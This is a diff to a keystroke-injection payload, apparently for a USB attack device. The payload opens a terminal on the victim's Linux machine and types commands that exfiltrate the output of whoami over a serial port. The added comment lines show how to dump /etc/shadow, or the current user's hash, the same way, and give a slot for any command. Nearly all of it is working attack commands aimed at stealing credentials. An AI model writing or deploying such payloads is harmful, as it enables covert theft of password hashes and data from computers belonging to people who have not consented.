@@ -3,4 +3,7 @@ Press:134+195
 PrintLine:gnome-terminal
 CustomDelay:1000
 PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;echo "SerialEXFIL:"$(whoami) > /dev/serial/by-id/*LilyPad*
-Rem: Another way: PrintLine:stty -F /dev/ttyACM0 38400;echo "SerialEXFIL:"$(whoami) > /dev/ttyACM0
+Rem: Replace "LINUX COMMAND HERE": PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;echo "SerialEXFIL:"$(LINUX COMMAND HERE) > /dev/serial/by-id/*LilyPad*
+Rem: Dump shadow file: stty -F /dev/serial/by-id/*LilyPad* 38400;echo "SerialEXFIL:"$(cat /etc/shadow) > /dev/serial/by-id/*LilyPad*
+Rem: Dump shadow file for current user: stty -F /dev/serial/by-id/*LilyPad* 38400;echo "SerialEXFIL:"$(cat /etc/shadow|grep $(whoami)) > /dev/serial/by-id/*LilyPad*
+Rem: Another way to access device: PrintLine:stty -F /dev/ttyACM0 38400;echo "SerialEXFIL:"$(whoami) > /dev/ttyACM0
